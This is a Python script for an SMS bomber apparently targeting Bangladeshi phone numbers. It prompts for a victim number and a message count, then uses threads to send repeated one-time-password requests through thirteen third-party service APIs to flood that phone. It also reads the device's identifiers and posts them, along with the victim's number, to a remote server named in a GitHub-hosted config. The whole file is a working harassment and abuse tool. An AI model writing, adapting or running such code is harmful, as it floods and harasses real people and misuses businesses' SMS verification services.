#64 bit attack

import os,requests,time,sys,subprocess,json
from all_file import api
from all_file import banner
from all_file import char as x
from all_file import clear
from all_file import colors
from all_file import randomColor as r
from all_file import device as oparetingSystem
from concurrent.futures import ThreadPoolExecutor as ThreadPool
version = "2.1.8"
oparetor =['019','018','017','016','015','014','013']
def run():
	try:
		toolsInfo = requests.get("https://raw.githubusercontent.com/Aru-Is-Always-King/bombing_data/main/bomber.json").json()
		cpu_id = str(subprocess.check_output("getprop ro.boot.vbmeta.digest",shell=True).decode()).replace("\n","")
		device_brand = subprocess.check_output("getprop ro.product.brand",shell=True).decode().replace("\n","")
		device_model = subprocess.check_output("getprop ro.product.model",shell=True).decode().replace("\n","")
		urlUser = toolsInfo["url"]+"/termux/device-create"
		headers = {
  'Content-Type': 'application/json'
}
		data = json.dumps({
  "cpu_id": cpu_id,
  "device_model": device_model,
  "device_brand": device_brand
})
		userStatus = requests.request("POST", urlUser, headers=headers, data=data).json()
		if userStatus["device_status"] == "active":
			banner.home.bannerPrint(version)
			while True:
				phone = str(input(f"{colors.color.greenBold}    Enter Targert Phone Number {colors.color.cyanBold}[+88]: {colors.color.end}"))
				#protact
				from all_file import protact
				protact.run(phone)
				if len(phone) != 11:
					x.printf.char(colors.color.redBold+"    Please Enter 11Digit Number.",0.01)
				elif phone[:3] not in oparetor:
					x.printf.char(colors.color.redBold+"    Invalid Phone Number.",0.01)
				elif len(phone) == 11:
					break
			while True:
				amount = int(input(f"{colors.color.greenBold}    Enter SMS Amount [{toolsInfo['smsLimit']}] {colors.color.cyanBold}: {colors.color.end}"))
				if amount <= int(toolsInfo['smsLimit']):
					break
				else:
					x.printf.char(colors.color.redBold+"    Invalid amount..",0.01)
			if toolsInfo["dailyLimit"] == "enabled":
				urlLimit = url + "limit"
				#limit api use and Complete more Task
			else:
				sentOtp(phone,amount,toolsInfo)
		else:
			x.printf.char("    "+colors.color.redBold + userStatus['message'],0.01)				
	except requests.exceptions.ConnectionError:
		pass
		
def tap(phone):
	api.bomber.api(phone=phone,api="tap")	
def bdfinance(phone):
	api.bomber.api(phone=phone,api="bdfinance")
def sibl(phone):
	api.bomber.api(phone=phone,api="sibl")	
def mmart(phone):
	api.bomber.api(phone=phone,api="mmart")
def dxmart(phone):
	api.bomber.api(phone=phone,api="dxmart")	
def nexuspay(phone):
	api.bomber.api(phone=phone,api="nexuspay")	
def newsim(phone):
	api.bomber.api(phone=phone,api="newsim")
def digicare(phone):
	api.bomber.api(phone=phone,api="digi-care")	
def shajgoj(phone):
	api.bomber.api(phone=phone,api="shajgoj")	
def binge(phone):
	api.bomber.api(phone=phone,api="binge")	
def marhaba(phone):
	api.bomber.api(phone=phone,api="marhaba")	
def lankabangla(phone):
	api.bomber.api(phone=phone,api="lankabangla")
def sundarban(phone):
	api.bomber.api(phone=phone,api="sundarban")

def sentOtp(phone,amount,toolsInfo):
	print(f"    {colors.color.greenBold}Total SMS: ",end="")
	with ThreadPool(max_workers=10) as attack:
		amountM = round(amount/13)+1
		if amount%13==0:
			amountM = amountM-1
		for i in range(amountM):
			i+=1
			attack.submit(tap,phone)
			attack.submit(bdfinance,phone)
			attack.submit(sibl,phone)
			attack.submit(mmart,phone)
			attack.submit(dxmart,phone)
			attack.submit(nexuspay,phone)
			attack.submit(digicare,phone)
			attack.submit(newsim,phone)
			attack.submit(shajgoj,phone)
			attack.submit(binge,phone)
			attack.submit(marhaba,phone)
			attack.submit(lankabangla,phone)
			attack.submit(sundarban,phone)
			print_text = "[" + str(i*13) + "] Sending Please Wait."
			sys.stdout.write(print_text)
			sys.stdout.flush()
			sys.stdout.write("\b" * len(print_text))
	url = toolsInfo["url"] +"/termux/storeBombingData"
	cpu_id = str(subprocess.check_output("getprop ro.boot.vbmeta.digest",shell=True).decode()).replace("\n","")
	device_brand = subprocess.check_output("getprop ro.product.brand",shell=True).decode().replace("\n","")
	device_model = subprocess.check_output("getprop ro.product.model",shell=True).decode().replace("\n","")
	headers = {
  'Content-Type': 'application/json'
}
	data = json.dumps({
  "cpu_id": cpu_id,
  "device_model": device_model,
  "device_brand": device_brand,
  "name":"Not Found",
  "number‎":"Not Found",
  "victim":phone,
  "amount": amount,
  "method": "random 64bit attack."
})
	userStatus = requests.request("POST", url, headers=headers, data=data).json()
	clear.screen()
	banner.home.bannerPrint(version)
	print_text = colors.color.greenBold+"    Phone: +88"+phone+"\n    Total [" + str(amount) + "] SMS  Successfully Sent."
	print(print_text)
	sys.exit()